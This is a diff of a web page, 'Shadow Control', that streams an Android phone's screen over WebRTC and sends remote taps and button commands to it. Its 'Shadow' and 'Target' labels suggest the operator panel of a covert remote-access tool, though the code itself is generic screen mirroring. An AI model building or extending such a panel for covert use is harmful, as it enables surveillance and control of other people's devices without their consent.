@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Shadow Admin Panel - Live Stream</title>
+    <title>Shadow Control - Live Stream</title>
     
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
@@ -39,7 +39,8 @@
 
         /* --- Phone Frame --- */
         .phone-frame {
-            width: 320px; height: 640px; border: 8px solid #222; border-radius: 30px;
+            width: 320px; height: 680px; /* Slightly taller for modern phones */
+            border: 8px solid #222; border-radius: 30px;
             background: #000; position: relative; box-shadow: 0 0 50px rgba(0,0,0,0.5);
             overflow: hidden; display: flex; align-items: center; justify-content: center;
         }
@@ -48,8 +49,9 @@
         #remoteVideo {
             width: 100%;
             height: 100%;
-            object-fit: contain; /* Pura screen dikhega bina kate */
+            object-fit: contain; /* Aspect ratio maintain karega */
             background-color: #000;
+            cursor: pointer; /* Clickable dikhane ke liye */
         }
         
         .offline-msg { position: absolute; color: #444; text-align: center; display: flex; flex-direction: column; align-items: center; pointer-events: none; }
@@ -123,7 +125,7 @@
         let currentDeviceId = null;
         let peerConnection;
         
-        // Google ke Free STUN Servers (Video connection establish karne ke liye)
+        // STUN Servers (Free Google Servers)
         const rtcConfig = {
             iceServers: [
                 { urls: 'stun:stun.l.google.com:19302' },
@@ -135,14 +137,14 @@
 
         window.addEventListener('load', function() {
             const urlParams = new URLSearchParams(window.location.search);
-            currentDeviceId = urlParams.get('id'); // URL se ID uthao (?id=123456)
+            currentDeviceId = urlParams.get('id'); // URL se ID lo
 
             if (currentDeviceId) {
                 document.getElementById('statusText').innerText = "Target: " + currentDeviceId;
                 startConnection();
             } else {
                 document.getElementById('statusText').innerText = "No Device ID";
-                document.getElementById('msgText').innerText = "Link me ID nahi hai";
+                document.getElementById('msgText').innerText = "Add ?id=12345 in URL";
             }
         });
 
@@ -153,30 +155,30 @@
             });
 
             socket.on("connect", () => {
-                console.log("Web Connected to Server");
+                console.log("✅ Web Connected to Server");
                 document.getElementById('statusText').innerText = "Connected to Server";
                 document.getElementById('statusText').style.color = "var(--accent)";
                 document.getElementById('dot').classList.add("active");
                 
-                // Join Room as Viewer
+                // Viewer bankar join karo
                 socket.emit("join-room", currentDeviceId);
             });
 
             // 🔥 1. Wait for OFFER from Android
             socket.on("offer", async (offer) => {
-                console.log("Received Offer from Android");
+                console.log("📩 Received Offer from Android");
                 document.getElementById('offlineMsg').style.display = "none";
 
                 if (peerConnection) peerConnection.close();
                 peerConnection = new RTCPeerConnection(rtcConfig);
 
-                // Jab Android se stream aaye, video me dikhao
+                // Jab stream aaye
                 peerConnection.ontrack = (event) => {
-                    console.log("Stream received!");
+                    console.log("🎥 Stream received!");
                     remoteVideo.srcObject = event.streams[0];
                 };
 
-                // ICE Candidates bhejo wapis Android ko
+                // Candidates wapis bhejo
                 peerConnection.onicecandidate = (event) => {
                     if (event.candidate) {
                         socket.emit("candidate", {
@@ -188,7 +190,6 @@
 
                 await peerConnection.setRemoteDescription(new RTCSessionDescription(offer));
                 
-                // Answer create karo aur Android ko bhejo
                 const answer = await peerConnection.createAnswer();
                 await peerConnection.setLocalDescription(answer);
                 
@@ -198,29 +199,28 @@
                 });
             });
 
-            // 🔥 2. Handle Candidates from Android
+            // 🔥 2. Handle Candidates
             socket.on("candidate", async (candidate) => {
                 if (peerConnection) {
                     try {
                         await peerConnection.addIceCandidate(new RTCIceCandidate(candidate));
-                    } catch (e) {
-                        console.error("Error adding candidate", e);
-                    }
+                    } catch (e) { console.error("Error adding candidate", e); }
                 }
             });
 
             socket.on("disconnect", () => {
-                console.log("Disconnected");
+                console.log("❌ Disconnected");
                 document.getElementById('statusText').innerText = "Offline";
                 document.getElementById('dot').classList.remove("active");
                 document.getElementById('offlineMsg').style.display = "flex";
             });
         }
 
-        // --- BUTTON COMMANDS (Same as before) ---
+        // --- BUTTON COMMANDS ---
         function sendCommand(action) {
             if(!socket || !currentDeviceId) return;
-            navigator.vibrate(50);
+            // Haptic feedback (if on mobile)
+            if(navigator.vibrate) navigator.vibrate(50);
             
             socket.emit("control-event", {
                 room: currentDeviceId,
@@ -229,21 +229,62 @@
             });
         }
 
-        // Click Handling (Optional: Agar video pe click bhejna ho)
+        // --- 🔥 PRO CLICK/TOUCH HANDLING 🔥 ---
+        // Ye function 'object-fit: contain' ke bawajood sahi coordinates nikalta hai
         remoteVideo.addEventListener('click', (event) => {
             if(!socket || !currentDeviceId) return;
+
             const rect = remoteVideo.getBoundingClientRect();
-            // Calculate scale agar video actual size se alag hai
-            const x = Math.round(event.clientX - rect.left);
-            const y = Math.round(event.clientY - rect.top);
-            
-            // NOTE: Video scale factor logic yahan add karna padega agar coordinates match nahi ho rahe
-            
-            socket.emit("control-event", {
-                room: currentDeviceId,
-                action: "click",
-                x: x, y: y
-            });
+            const videoWidth = remoteVideo.videoWidth;
+            const videoHeight = remoteVideo.videoHeight;
+            const elementWidth = rect.width;
+            const elementHeight = rect.height;
+
+            // Aspect Ratios
+            const videoRatio = videoWidth / videoHeight;
+            const elementRatio = elementWidth / elementHeight;
+
+            let displayedWidth, displayedHeight;
+            let startX = 0, startY = 0;
+
+            // Calculate actual video size displayed on screen
+            if (elementRatio > videoRatio) {
+                // Letterboxing left/right (Black bars on sides)
+                displayedHeight = elementHeight;
+                displayedWidth = displayedHeight * videoRatio;
+                startX = (elementWidth - displayedWidth) / 2;
+            } else {
+                // Letterboxing top/bottom (Black bars top/bottom)
+                displayedWidth = elementWidth;
+                displayedHeight = displayedWidth / videoRatio;
+                startY = (elementHeight - displayedHeight) / 2;
+            }
+
+            // Click position relative to the video element
+            const clickX = event.clientX - rect.left;
+            const clickY = event.clientY - rect.top;
+
+            // Check if click is inside the actual video area (ignore black bars)
+            if (clickX >= startX && clickX <= startX + displayedWidth &&
+                clickY >= startY && clickY <= startY + displayedHeight) {
+                
+                // Calculate percentage (0.0 to 1.0) relative to actual video
+                const relX = (clickX - startX) / displayedWidth;
+                const relY = (clickY - startY) / displayedHeight;
+
+                // Scale to actual video resolution (Android resolution)
+                const finalX = Math.round(relX * videoWidth);
+                const finalY = Math.round(relY * videoHeight);
+
+                console.log(`Sending Tap: X=${finalX}, Y=${finalY}`);
+
+                socket.emit("control-event", {
+                    room: currentDeviceId,
+                    action: "tap", // Android "tap" action handle karega
+                    x: finalX, 
+                    y: finalY
+                });
+            }
         });
 
     </script>
